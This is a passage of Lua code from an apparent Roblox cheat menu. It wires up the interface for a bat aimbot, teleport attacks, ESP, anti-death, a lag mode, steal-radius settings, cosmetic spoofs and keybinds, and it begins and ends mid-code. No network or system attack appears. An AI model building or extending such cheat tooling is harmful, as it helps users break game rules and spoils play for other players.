                    StealRadii.Normal = v
                end
                saveConfig()
            end)
            radiusRow.Parent = parent
            local function wire(name, setters)
                for _, d in ipairs(radiusRow:GetDescendants()) do
                    if d:IsA("TextBox") then
                        table.insert(setters, function(val)
                            if val == nil then return end
                            local n = tonumber(val) or val
                            d.Text = (type(n)=="number" and n == math.floor(n)) and tostring(math.floor(n)) or tostring(n)
                        end)
                    end
                end
            end
            -- only radius row here
            for _, d in ipairs(radiusRow:GetDescendants()) do
                if d:IsA("TextBox") then
                    table.insert(_stealRadiusUISetters, function(val)
                        if val == nil then return end
                        local n = tonumber(val) or val
                        d.Text = (type(n)=="number" and n == math.floor(n)) and tostring(math.floor(n)) or tostring(n)
                    end)
                end
            end
            local durRow = makeSlider("Duration", 0.1, 5, Steal.StealDuration, function(v) Steal.StealDuration=v; saveConfig() end)
            durRow.Parent = parent
            for _, d in ipairs(durRow:GetDescendants()) do
                if d:IsA("TextBox") then
                    table.insert(_stealDurationUISetters, function(val)
                        if val == nil then return end
                        local n = tonumber(val) or val
                        d.Text = (type(n)=="number" and math.abs(n - math.floor(n)) < 0.05) and tostring(math.floor(n)) or string.format("%.1f", n)
                    end)
                end
            end
            if stealMode == "semi" then
                Steal.StealRadius = 10
                pcall(refreshStealRadiusUI)
            end
        end

        do
            local container = new("Frame",{
                Size=UDim2.new(1,0,0,140),
                BackgroundTransparency=1,
                BorderSizePixel=0,
            })
            container.Parent = parent
            new("UIListLayout",{Parent=container,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,4)})

            local labelRow = row(28)
            labelRow.Parent = container
            labelRow.LayoutOrder = 1
            new("TextLabel",{
                Parent=labelRow,
                Size=UDim2.new(1,-14,1,0),
                Position=UDim2.fromOffset(14,0),
                BackgroundTransparency=1,
                Text="Bar Position",
                Font=Enum.Font.GothamMedium,
                TextSize=13,
                TextColor3=Color3.fromRGB(235,235,235),
                TextXAlignment=Enum.TextXAlignment.Left,
            })

            local btnRow = new("Frame",{
                Parent=container,
                Size=UDim2.new(1,0,0,32),
                BackgroundTransparency=1,
                BorderSizePixel=0,
                LayoutOrder=2,
            })
            new("UIListLayout",{
                Parent=btnRow,
                FillDirection=Enum.FillDirection.Horizontal,
                HorizontalAlignment=Enum.HorizontalAlignment.Center,
                VerticalAlignment=Enum.VerticalAlignment.Center,
                Padding=UDim.new(0,6),
                SortOrder=Enum.SortOrder.LayoutOrder,
            })

            local upBtn, downBtn, customBtn, resetBtn
            local function paintBarPos()
                local m = string.upper(tostring(stealBarPos or "UP"))
                if upBtn then
                    upBtn.BackgroundColor3 = (m == "UP") and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                    upBtn.TextColor3 = (m == "UP") and accentTextColor3(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                end
                if downBtn then
                    downBtn.BackgroundColor3 = (m == "DOWN") and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                    downBtn.TextColor3 = (m == "DOWN") and accentTextColor3(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                end
                if customBtn then
                    customBtn.BackgroundColor3 = (m == "CUSTOM") and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                    customBtn.TextColor3 = (m == "CUSTOM") and accentTextColor3(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                end
            end
            upBtn = new("TextButton",{
                Parent=btnRow,
                Size=UDim2.fromOffset(52,26),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text="UP",
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=Color3.fromRGB(200,200,200),
                AutoButtonColor=false,
                BorderSizePixel=0,
                LayoutOrder=1,
            },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            downBtn = new("TextButton",{
                Parent=btnRow,
                Size=UDim2.fromOffset(58,26),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text="DOWN",
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=Color3.fromRGB(200,200,200),
                AutoButtonColor=false,
                BorderSizePixel=0,
                LayoutOrder=2,
            },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            customBtn = new("TextButton",{
                Parent=btnRow,
                Size=UDim2.fromOffset(68,26),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text="CUSTOM",
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=Color3.fromRGB(200,200,200),
                AutoButtonColor=false,
                BorderSizePixel=0,
                LayoutOrder=3,
            },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            resetBtn = new("TextButton",{
                Parent=btnRow,
                Size=UDim2.fromOffset(40,26),
                BackgroundColor3=Color3.fromRGB(28,14,14),
                Text="RST",
                Font=Enum.Font.GothamBold,
                TextSize=10,
                TextColor3=Color3.fromRGB(255,160,160),
                AutoButtonColor=false,
                BorderSizePixel=0,
                LayoutOrder=4,
            },{corner(6), stroke(Color3.fromRGB(120,40,40),1,0.25)})
            local function setBarPos(pos)
                stealBarPos = pos
                paintBarPos()
                if stealBarFrame then stealBarFrame.Visible = true end
                if applyStealBarPosition then applyStealBarPosition() end
                saveConfig()
            end
            upBtn.MouseButton1Click:Connect(function() setBarPos("UP") end)
            downBtn.MouseButton1Click:Connect(function() setBarPos("DOWN") end)
            customBtn.MouseButton1Click:Connect(function() setBarPos("CUSTOM") end)
            resetBtn.MouseButton1Click:Connect(function()
                stealBarCustomX = 0.5
                stealBarCustomY = 0.02
                setBarPos("UP")
                resetBtn.Text = "OK"
                task.delay(0.7, function()
                    if resetBtn and resetBtn.Parent then resetBtn.Text = "RST" end
                end)
            end)
            onAccent(function() paintBarPos() end, upBtn)
            paintBarPos()

            local styleLabelRow = row(28)
            styleLabelRow.Parent = container
            styleLabelRow.LayoutOrder = 3
            new("TextLabel",{
                Parent=styleLabelRow,
                Size=UDim2.new(1,-14,1,0),
                Position=UDim2.fromOffset(14,0),
                BackgroundTransparency=1,
                Text="Bar Style",
                Font=Enum.Font.GothamMedium,
                TextSize=13,
                TextColor3=Color3.fromRGB(235,235,235),
                TextXAlignment=Enum.TextXAlignment.Left,
            })

            local styleBtnRow = new("Frame",{
                Parent=container,
                Size=UDim2.new(1,0,0,32),
                BackgroundTransparency=1,
                BorderSizePixel=0,
                LayoutOrder=4,
            })
            new("UIListLayout",{
                Parent=styleBtnRow,
                FillDirection=Enum.FillDirection.Horizontal,
                HorizontalAlignment=Enum.HorizontalAlignment.Center,
                VerticalAlignment=Enum.VerticalAlignment.Center,
                Padding=UDim.new(0,6),
                SortOrder=Enum.SortOrder.LayoutOrder,
            })

            local opt1Btn, opt2Btn, opt3Btn, opt4Btn
            local opt5Btn
            local function paintBarStyle()
                local s = (type(stealBarStyle)=="number") and math.clamp(math.floor(stealBarStyle),1,5) or 1
                for i, btn in pairs({[1]=opt1Btn,[2]=opt2Btn,[3]=opt3Btn,[4]=opt4Btn,[5]=opt5Btn}) do
                    if btn then
                        btn.BackgroundColor3 = (s == i) and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                        btn.TextColor3 = (s == i) and accentTextColor(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                    end
                end
            end
            local function makeStyleBtn(textLabel, order)
                return new("TextButton",{
                    Parent=styleBtnRow,
                    Size=UDim2.fromOffset(72,26),
                    BackgroundColor3=Color3.fromRGB(18,18,18),
                    Text=textLabel,
                    Font=Enum.Font.GothamBold,
                    TextSize=10,
                    TextColor3=Color3.fromRGB(200,200,200),
                    AutoButtonColor=false,
                    BorderSizePixel=0,
                    LayoutOrder=order,
                },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            end
            opt1Btn = makeStyleBtn("OPT 1", 1)
            opt2Btn = makeStyleBtn("OPT 2", 2)
            opt3Btn = makeStyleBtn("OPT 3", 3)
            local opt4Btn = makeStyleBtn("OPT 4", 4)
            opt5Btn = makeStyleBtn("BASIC", 5)
            local function setBarStyle(style)
                stealBarStyle = math.clamp(style, 1, 5)
                paintBarStyle()
                if createStealBar then pcall(createStealBar) end
                saveConfig()
            end
            opt1Btn.MouseButton1Click:Connect(function() setBarStyle(1) end)
            opt2Btn.MouseButton1Click:Connect(function() setBarStyle(2) end)
            opt3Btn.MouseButton1Click:Connect(function() setBarStyle(3) end)
            opt4Btn.MouseButton1Click:Connect(function() setBarStyle(4) end)
            opt5Btn.MouseButton1Click:Connect(function() setBarStyle(5) end)
            onAccent(function() paintBarStyle() end, opt1Btn)
            paintBarStyle()
        end

        sectionLabel("Bat Aimbot").Parent = parent

        makeToggle("Anti Die", antiDieEnabled, nil, function(on)
            if on then startAntiDie() else stopAntiDie() end
            antiDieEnabled = on
            if saveConfig then pcall(saveConfig) end
        end).Parent = parent

        local batAimContainer = makeToggle("Bat Aimbot", autoBatEnabled, "X", function(on)
            if on then
                if autoLeftEnabled then autoLeftEnabled=false;stopAutoLeft();if autoLeftSetVisual then autoLeftSetVisual(false) end;if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
                if autoRightEnabled then autoRightEnabled=false;stopAutoRight();if autoRightSetVisual then autoRightSetVisual(false) end;if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
                queueAutoBatStart()
                if mobBtnRefs.autoBat then mobBtnRefs.autoBat(true) end
            else
                stopBatAimbot()
                if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
            end
            saveConfig()
        end)
        batAimContainer.Parent = parent

        makeSlider("Aimbot Speed", 10, 120, aimbotSpeed or 58, function(v)
            aimbotSpeed = v
            saveConfig()
        end).Parent = parent

        makeToggle("Auto Swing", autoSwingEnabled, nil, function(on)
            autoSwingEnabled=on
            saveConfig()
        end).Parent = parent
        makeToggle("Bat Counter", batCounterEnabled, nil, function(on)
            batCounterEnabled=on
            if on then startBatCounter() else stopBatCounter() end
            saveConfig()
        end).Parent = parent
        makeToggle("TP Bat", TPBat.enabled, "M", function(on)
            if on then TPBat.start() else TPBat.stop() end
            if mobBtnRefs.tpBat then mobBtnRefs.tpBat(TPBat.enabled) end
            saveConfig()
        end).Parent = parent
        -- V1 Ocean | V2 7UP AntiDesync
        do
            local rowV = row(30)
            rowV.Parent = parent
            new("UIListLayout",{Parent=rowV,FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder})
            local function mk(txt, order)
                return new("TextButton",{
                    Parent=rowV, Size=UDim2.fromOffset(100,26), BackgroundColor3=Color3.fromRGB(18,18,18),
                    Text=txt, Font=Enum.Font.GothamBold, TextSize=11, TextColor3=Color3.fromRGB(200,200,200),
                    AutoButtonColor=false, BorderSizePixel=0, LayoutOrder=order,
                },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            end
            local v1b, v2b = mk("TP BAT V1", 1), mk("TP BAT V2", 2)
            local function paint()
                local v = tostring(tpBatVersion or "v1")
                for _, pair in ipairs({{v1b,"v1"},{v2b,"v2"}}) do
                    local b, name = pair[1], pair[2]
                    local on = (v == name)
                    b.BackgroundColor3 = on and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                    b.TextColor3 = on and accentTextColor(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                end
            end
            local function setV(v)
                tpBatVersion = v
                if saveConfig then pcall(saveConfig) end
                paint()
                saveConfig()
            end
            v1b.MouseButton1Click:Connect(function() setV("v1") end)
            v2b.MouseButton1Click:Connect(function() setV("v2") end)
            onAccent(function() paint() end, v1b)
            paint()
        end
        makeSlider("TP Bat Distance", 1, 50, tpBatDistance or 8, function(v)
            tpBatDistance = v
            saveConfig()
        end).Parent = parent
        makeToggle("Medusa Counter", medusaCounterEnabled, nil, function(on)
            medusaCounterEnabled=on
            if on then setupMedusa(LP.Character) else stopMedusaCounter() end
            saveConfig()
        end).Parent = parent

        sectionLabel("Actions").Parent = parent

        makeToggle("Drop Brainrot", false, "G", function() runDrop() end, nil, false).Parent = parent
        makeToggle("TP Down", false, "T", function() runTPFloor() end, nil, false).Parent = parent

        -- Reset at bottom of Combat
        sectionLabel("Reset").Parent = parent
        makeToggle("Instant Reset", false, "F", function()
            if doInstantReset then doInstantReset() end
        end, nil, false).Parent = parent
        makeToggle("Instant Reset On Die", autoResetOnDieEnabled, nil, function(on)
            autoResetOnDieEnabled = on
            if on and LP.Character and setupAutoResetOnDie then pcall(setupAutoResetOnDie, LP.Character) end
            saveConfig()
        end).Parent = parent
        makeToggle("Reset On MD", autoResetOnMedusaEnabled, nil, function(on)
            autoResetOnMedusaEnabled = on
            if on and LP.Character and setupMedusa then pcall(setupMedusa, LP.Character) end
            saveConfig()
        end).Parent = parent
    end

    local function buildSettings(parent)
        sectionLabel("Config").Parent = parent
        local saveRow = row(46)
        saveRow.Parent = parent
        local saveBtn = new("TextButton",{
            Parent=saveRow,
            Size=UDim2.new(1,-24,0,30),
            Position=UDim2.fromOffset(12,8),
            BackgroundColor3=ACCENT,
            Text="SAVE CONFIG",
            Font=Enum.Font.GothamBold,
            TextSize=12,
            TextColor3=accentTextColor(ACCENT),
            AutoButtonColor=false,
            BorderSizePixel=0,
        },{corner(8)})
        onAccent(function(a)
            saveBtn.BackgroundColor3=a
            saveBtn.TextColor3=accentTextColor(a)
        end,saveBtn)
        saveBtn.MouseButton1Click:Connect(function()
            saveConfig()
            saveBtn.Text="SAVED!"
            task.delay(1.2,function()
                if saveBtn and saveBtn.Parent then saveBtn.Text="SAVE CONFIG" end
            end)
        end)

        sectionLabel("Panel Positions").Parent = parent
        do
            local posRow = row(46)
            posRow.Parent = parent
            local savePosBtn = new("TextButton",{
                Parent=posRow,
                Size=UDim2.new(1,-24,0,30),
                Position=UDim2.fromOffset(12,8),
                BackgroundColor3=ACCENT,
                Text="SAVE POSITION (HUB)",
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=accentTextColor(ACCENT),
                AutoButtonColor=false,
                BorderSizePixel=0,
            },{corner(8)})
            onAccent(function(a)
                savePosBtn.BackgroundColor3=a
                savePosBtn.TextColor3=accentTextColor(a)
            end, savePosBtn)
            savePosBtn.MouseButton1Click:Connect(function()
                pcall(saveGuiPositions)
                saveConfig()
                savePosBtn.Text = "POSITION SAVED!"
                task.delay(1.2, function()
                    if savePosBtn and savePosBtn.Parent then
                        savePosBtn.Text = "SAVE POSITION (HUB)"
                    end
                end)
            end)
            local resetRow = row(46)
            resetRow.Parent = parent
            local resetPosBtn = new("TextButton",{
                Parent=resetRow,
                Size=UDim2.new(1,-24,0,30),
                Position=UDim2.fromOffset(12,8),
                BackgroundColor3=Color3.fromRGB(180,40,40),
                Text="RESET POSITION (CENTER)",
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=Color3.fromRGB(255,230,230),
                AutoButtonColor=false,
                BorderSizePixel=0,
            },{corner(8), stroke(Color3.fromRGB(220,70,70),1,0.25)})
            resetPosBtn.MouseButton1Click:Connect(function()
                pcall(resetGuiPositions)
                saveConfig()
                resetPosBtn.Text = "RESET TO CENTER!"
                task.delay(1.2, function()
                    if resetPosBtn and resetPosBtn.Parent then
                        resetPosBtn.Text = "RESET POSITION (CENTER)"
                    end
                end)
            end)
        end

        sectionLabel("Keybinds").Parent = parent
        do
            local function currentKeyFor(actionName, fallback)
                if _GuiKeys and type(_GuiKeys[actionName]) == "string" and Enum.KeyCode[_GuiKeys[actionName]] then
                    return _GuiKeys[actionName]
                end
                if _SavedGuiKeys and type(_SavedGuiKeys[actionName]) == "string" and Enum.KeyCode[_SavedGuiKeys[actionName]] then
                    return _SavedGuiKeys[actionName]
                end
                return fallback
            end

            local function rebindAction(actionName, oldKeyName, newKc)
                if oldKeyName and Enum.KeyCode[oldKeyName] then
                    local oldKc = Enum.KeyCode[oldKeyName]
                    local bucket = keybindMap[oldKc]
                    if bucket then
                        bucket[actionName] = nil
                        if not next(bucket) then keybindMap[oldKc] = nil end
                    end
                end
                -- Prefer the real persistent callback
                local fn = (_PersistentActions and _PersistentActions[actionName]) or nil
                for kc, bucket in pairs(keybindMap) do
                    if type(bucket) == "table" and bucket[actionName] then
                        if not fn then fn = bucket[actionName] end
                        bucket[actionName] = nil
                        if not next(bucket) then keybindMap[kc] = nil end
                    end
                end
                if not fn then fn = function() end end
                keybindMap[newKc] = keybindMap[newKc] or {}
                keybindMap[newKc][actionName] = fn
                if _PersistentActions then _PersistentActions[actionName] = fn end
                if _GuiKeys then _GuiKeys[actionName] = newKc.Name end
                -- Sync legacy KB table
                if actionName == "Drop Brainrot" and KB and KB.DropBrainrot then KB.DropBrainrot.kb = newKc end
                if actionName == "TP Down" and KB and KB.TPFloor then KB.TPFloor.kb = newKc end
                if actionName == "TP Bat" and KB and KB.TPBat then KB.TPBat.kb = newKc end
                if actionName == "Auto Left" and KB and KB.AutoLeft then KB.AutoLeft.kb = newKc end
                if actionName == "Auto Right" and KB and KB.AutoRight then KB.AutoRight.kb = newKc end
                if actionName == "Bat Aimbot" and KB and KB.AutoBat then KB.AutoBat.kb = newKc end
                if actionName == "Lagger Mode" and KB and KB.LaggerToggle then KB.LaggerToggle.kb = newKc end
                if actionName == "Carry Mode" and KB and KB.SpeedToggle then KB.SpeedToggle.kb = newKc end
                if actionName == "Toggle GUI" and KB and KB.GuiHide then KB.GuiHide.kb = newKc end
                if saveConfig then pcall(saveConfig) end
            end

            local function makeKeybindRow(label, actionName, defaultKey)
                local r = row(46)
                r.Parent = parent
                new("TextLabel",{
                    Parent=r,
                    Size=UDim2.new(1,-90,1,0),
                    Position=UDim2.fromOffset(14,0),
                    BackgroundTransparency=1,
                    Text=label,
                    Font=Enum.Font.GothamMedium,
                    TextSize=13,
                    TextColor3=Color3.fromRGB(235,235,235),
                    TextXAlignment=Enum.TextXAlignment.Left,
                })
                local keyName = currentKeyFor(actionName, defaultKey)
                local kc = Enum.KeyCode[keyName]
                local btn = new("TextButton",{
                    Parent=r,
                    Size=UDim2.fromOffset(70,26),
                    Position=UDim2.new(1,-82,0.5,-13),
                    BackgroundColor3=Color3.fromRGB(18,18,18),
                    Text=kc and prettyKey(kc) or keyName,
                    Font=Enum.Font.GothamBold,
                    TextSize=12,
                    TextColor3=Color3.fromRGB(220,220,220),
                    AutoButtonColor=false,
                    BorderSizePixel=0,
                },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.3)})
                onAccent(function(a)
                    local s = btn:FindFirstChildOfClass("UIStroke")
                    if s then s.Color = a end
                end, btn)
                btn.MouseButton1Click:Connect(function()
                    local prevName = currentKeyFor(actionName, defaultKey)
                    startKeyListen(btn, function(newKc)
                        rebindAction(actionName, prevName, newKc)
                        btn.Text = prettyKey(newKc)
                    end)
                end)
            end

            makeKeybindRow("Open / Close GUI", "Toggle GUI", "Insert")
        end

        sectionLabel("Accent Color").Parent = parent
        do
            local colorRow = row(86)
            colorRow.Parent = parent
            new("TextLabel",{
                Parent=colorRow,
                Size=UDim2.new(0,58,1,0),
                Position=UDim2.fromOffset(12,0),
                BackgroundTransparency=1,
                Text="Theme",
                Font=Enum.Font.GothamMedium,
                TextSize=13,
                TextColor3=Color3.fromRGB(235,235,235),
                TextXAlignment=Enum.TextXAlignment.Left,
            })
            local holder = new("Frame",{
                Parent=colorRow,
                Size=UDim2.fromOffset(168,68),
                Position=UDim2.new(1,-176,0.5,-34),
                BackgroundTransparency=1,
                BorderSizePixel=0,
            })
            local topRow = new("Frame",{Parent=holder,Size=UDim2.new(1,0,0,30),Position=UDim2.fromOffset(0,2),BackgroundTransparency=1,BorderSizePixel=0})
            new("UIListLayout",{Parent=topRow,FillDirection=Enum.FillDirection.Horizontal,HorizontalAlignment=Enum.HorizontalAlignment.Right,VerticalAlignment=Enum.VerticalAlignment.Center,Padding=UDim.new(0,4)})
            local botRow = new("Frame",{Parent=holder,Size=UDim2.new(1,0,0,30),Position=UDim2.fromOffset(0,36),BackgroundTransparency=1,BorderSizePixel=0})
            new("UIListLayout",{Parent=botRow,FillDirection=Enum.FillDirection.Horizontal,HorizontalAlignment=Enum.HorizontalAlignment.Right,VerticalAlignment=Enum.VerticalAlignment.Center,Padding=UDim.new(0,4)})
            local colorSquares = {}
            for i, theme in ipairs(UI_THEMES) do
                local parentRow = (i <= 5) and topRow or botRow
                local sq = new("TextButton",{Parent=parentRow,Size=UDim2.fromOffset(28,28),BackgroundColor3=theme.accent,Text="",AutoButtonColor=false,BorderSizePixel=0})
                Instance.new("UICorner", sq).CornerRadius = UDim.new(0, 4)
                local ring = stroke(Color3.fromRGB(255,255,255), 2, i==uiThemeIndex and 0 or 1)
                ring.Parent = sq
                colorSquares[i] = {btn=sq, ring=ring}
                sq.MouseButton1Click:Connect(function()
                    applyUITheme(i)
                    for j, c in ipairs(colorSquares) do
                        TweenService:Create(c.ring, TweenInfo.new(0.18), {Transparency = (j==i) and 0 or 1}):Play()
                    end
                    saveConfig()
                end)
            end

        end

        sectionLabel("Visual Settings").Parent = parent
        makeToggle("Anims Enabled", animEnabled, nil, function(on)
            animEnabled = on
            if on then
                if startAnimToggle then startAnimToggle() end
                if applyAnimationPack and selectedAnimPack and LP.Character then
                    task.spawn(function() applyAnimationPack(selectedAnimPack, LP.Character) end)
                end
            else
                if stopAnimToggle then stopAnimToggle() end
            end
            saveConfig()
        end).Parent = parent
        do
            local packNames = {}
            for name in pairs(ANIMATION_PACKS or {}) do
                table.insert(packNames, name)
            end
            table.sort(packNames)
            if #packNames == 0 then packNames = {"Adidas Sports"} end
            local packIdx = 1
            for i, n in ipairs(packNames) do
                if n == selectedAnimPack then packIdx = i break end
            end
            local packRow = row(46)
            packRow.Parent = parent
            new("TextLabel",{
                Parent=packRow, Size=UDim2.new(0.38,0,1,0), Position=UDim2.fromOffset(14,0),
                BackgroundTransparency=1, Text="Anim Pack", Font=Enum.Font.GothamMedium,
                TextSize=13, TextColor3=Color3.fromRGB(235,235,235), TextXAlignment=Enum.TextXAlignment.Left,
            })
            local packBtn = new("TextButton",{
                Parent=packRow, Size=UDim2.fromOffset(150,26), Position=UDim2.new(1,-162,0.5,-13),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text=tostring(selectedAnimPack or packNames[1]),
                Font=Enum.Font.GothamBold, TextSize=10, TextColor3=Color3.fromRGB(220,235,255),
                AutoButtonColor=false, BorderSizePixel=0, TextTruncate=Enum.TextTruncate.AtEnd,
            },{corner(6), stroke(Color3.fromRGB(55,105,165),1,0.2)})
            onAccent(function(a)
                local border = packBtn:FindFirstChildOfClass("UIStroke")
                if border then border.Color = a end
            end, packBtn)
            packBtn.MouseButton1Click:Connect(function()
                packIdx = packIdx % #packNames + 1
                selectedAnimPack = packNames[packIdx]
                packBtn.Text = selectedAnimPack
                if animEnabled and applyAnimationPack and LP.Character then
                    task.spawn(function() applyAnimationPack(selectedAnimPack, LP.Character) end)
                end
                saveConfig()
            end)
        end
        makeToggle("Headless", headlessEnabled, nil, function(on)
            local ok, err = setHeadlessAppearance(on)
            if ok then
                headlessEnabled = on
            else
                headlessEnabled = false
                warn("Headless failed: " .. tostring(err))
            end
            saveConfig()
        end).Parent = parent

        makeToggle("Korblox", korbloxEnabled, nil, function(on)
            local ok, err = setKorbloxAppearance(on)
            if ok then
                korbloxEnabled = on
            else
                korbloxEnabled = false
                warn("Korblox failed: " .. tostring(err))
            end
            saveConfig()
        end).Parent = parent

        local legRow = row(46)
        legRow.Parent = parent
        new("TextLabel",{Parent=legRow,Size=UDim2.new(1,-112,1,0),Position=UDim2.fromOffset(14,0),BackgroundTransparency=1,
            Text="Korblox Leg",Font=Enum.Font.GothamMedium,TextSize=14,TextColor3=Color3.fromRGB(235,235,235),TextXAlignment=Enum.TextXAlignment.Left})
        local legButton = new("TextButton",{Parent=legRow,Size=UDim2.fromOffset(86,26),Position=UDim2.new(1,-98,0.5,-13),
            BackgroundColor3=Color3.fromRGB(18,18,18),Text=korbloxLeg,Font=Enum.Font.GothamBold,TextSize=12,
            TextColor3=Color3.fromRGB(220,235,255),AutoButtonColor=false,BorderSizePixel=0},{corner(6),stroke(Color3.fromRGB(55,105,165),1,0.2)})
        local legOptions = {"Left", "Right", "Both"}
        local legIndex = 1
        for i, option in ipairs(legOptions) do if option == korbloxLeg then legIndex = i; break end end
        onAccent(function(a)
            local border = legButton:FindFirstChildOfClass("UIStroke")
            if border then border.Color = a end
        end, legButton)
        legButton.MouseButton1Click:Connect(function()
            legIndex = legIndex % #legOptions + 1
            korbloxLeg = legOptions[legIndex]
            legButton.Text = korbloxLeg
            if korbloxEnabled then
                local ok, err = setKorbloxAppearance(true)
                if not ok then
                    korbloxEnabled = false
                    warn("Korblox failed: " .. tostring(err))
                end
            end
            saveConfig()
        end)

        makeToggle("Heartless ESP", blueEspEnabled, nil, function(on)
            blueEspEnabled = on
            if on then startBlueESP() else stopBlueESP() end
            saveConfig()
        end).Parent = parent
        -- Speed ESP removed
        pcall(function() if stopSpeedESP then stopSpeedESP() end end)
        speedEspEnabled = false
        -- Body Lock removed from UI
        makeToggle("Intro Song", introSoundEnabled, nil, function(on)
            introSoundEnabled=on
            if not on and introSoundInstance and introSoundInstance.IsPlaying then pcall(function() introSoundInstance:Stop() end) end
            if on then pcall(playIntroSound) end
            saveConfig()
        end).Parent = parent
        -- Cycle intro track (7UP song list)
        do
            local songNames = {"Blue Bands","Legacy","paznerknacker","Tesla","King Nasir","Pure Cocaine","nuts","Gelato","FREAKED OUT","Scam Likely","NONE"}
            local rowS = row(30)
            rowS.Parent = parent
            local songBtn = new("TextButton",{
                Parent=rowS,
                Size=UDim2.new(1,-16,0,26),
                Position=UDim2.fromOffset(8,2),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text="INTRO TRACK: " .. (songNames[selectedIntroMusic or 1] or "?"),
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=Color3.fromRGB(220,220,230),
                AutoButtonColor=false,
                BorderSizePixel=0,
            },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            songBtn.MouseButton1Click:Connect(function()
                selectedIntroMusic = (tonumber(selectedIntroMusic) or 1) % 11 + 1
                songBtn.Text = "INTRO TRACK: " .. (songNames[selectedIntroMusic] or "?")
                saveConfig()
            end)
            pcall(function() songBtn.Activated:Connect(function()
                selectedIntroMusic = (tonumber(selectedIntroMusic) or 1) % 11 + 1
                songBtn.Text = "INTRO TRACK: " .. (songNames[selectedIntroMusic] or "?")
                saveConfig()
            end) end)
        end
        makeToggle("Intro", introEnabled, nil, function(on)
            introEnabled = on
            if not on and _introActive then
                pcall(stopIntroCinematic, true)
            end
            saveConfig()
        end).Parent = parent

        -- 3 intro styles + tablet preview
        do
            introStyle = math.clamp(tonumber(introStyle) or 1, 1, 6)
            local names = {[1]="LETTERS",[2]="WAVE",[3]="HORIZON",[4]="GLITCH",[5]="RADAR",[6]="CURTAIN"}
            local rowI = row(30)
            rowI.Parent = parent
            new("UIListLayout",{Parent=rowI,FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder})
            local btns = {}
            local tablet, previewToken = nil, 0
            local function stopPreview()
                previewToken = previewToken + 1
                if tablet then
                    for _, c in ipairs(tablet:GetChildren()) do
                        if c.Name == "PreviewLayer" then c:Destroy() end
                    end
                end
            end
            local function runPreview(style)
                if not tablet then return end
                stopPreview()
                local my = previewToken
                local ACC = ACCENT_COLOR or Color3.fromRGB(56, 140, 255)
                local WHITE = Color3.fromRGB(255, 255, 255)
                local BLACK = Color3.fromRGB(8, 10, 16)
                local layer = Instance.new("Frame", tablet)
                layer.Name = "PreviewLayer"
                layer.Size = UDim2.fromScale(1, 1)
                layer.BackgroundColor3 = ACC
                layer.BackgroundTransparency = 0
                layer.BorderSizePixel = 0
                layer.ClipsDescendants = true
                layer.ZIndex = 5
                Instance.new("UICorner", layer).CornerRadius = UDim.new(0, 12)
                local function tw(o, ti, props)
                    local twn = TweenService:Create(o, TweenInfo.new(ti, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props)
                    twn:Play(); return twn
                end
                task.spawn(function()
                    style = math.clamp(tonumber(style) or 1, 1, 6)
                    if style == 1 then
                        -- LETTERS
                        layer.BackgroundColor3 = ACC
                        local stage = Instance.new("Frame", layer)
                        stage.Size = UDim2.fromScale(1, 1)
                        stage.BackgroundTransparency = 1
                        stage.ZIndex = 6
                        local word = {"O","C","E","A","N"}
                        local dirs = {1,-1,1,-1,1}
                        for i, ch in ipairs(word) do
                            local lbl = Instance.new("TextLabel", stage)
                            lbl.Size = UDim2.fromOffset(22, 28)
                            lbl.AnchorPoint = Vector2.new(0.5, 0.5)
                            lbl.Position = UDim2.new(0.2 + (i-1)*0.15, 0, 0.5, dirs[i]*40)
                            lbl.BackgroundTransparency = 1
                            lbl.Text = ch
                            lbl.TextColor3 = WHITE
                            lbl.TextTransparency = 1
                            lbl.Font = Enum.Font.GothamBlack
                            lbl.TextSize = 20
                            lbl.ZIndex = 7
                            task.delay((i-1)*0.06, function()
                                if previewToken ~= my or not lbl.Parent then return end
                                tw(lbl, 0.35, {Position = UDim2.new(0.2+(i-1)*0.15,0,0.5,0), TextTransparency = 0})
                            end)
                        end
                        task.wait(1.6)
                    elseif style == 2 then
                        -- WAVE bars
                        layer.BackgroundColor3 = ACC
                        local bars = {}
                        for i = 1, 12 do
                            local b = Instance.new("Frame", layer)
                            b.AnchorPoint = Vector2.new(0.5, 1)
                            b.Position = UDim2.fromScale(0.06 + (i-1)*0.08, 0.85)
                            b.Size = UDim2.fromOffset(8, 10)
                            b.BackgroundColor3 = WHITE
                            b.BorderSizePixel = 0
                            b.ZIndex = 6
                            Instance.new("UICorner", b).CornerRadius = UDim.new(1, 0)
                            bars[i] = b
                        end
                        local t = Instance.new("TextLabel", layer)
                        t.Size = UDim2.fromScale(1, 0.3)
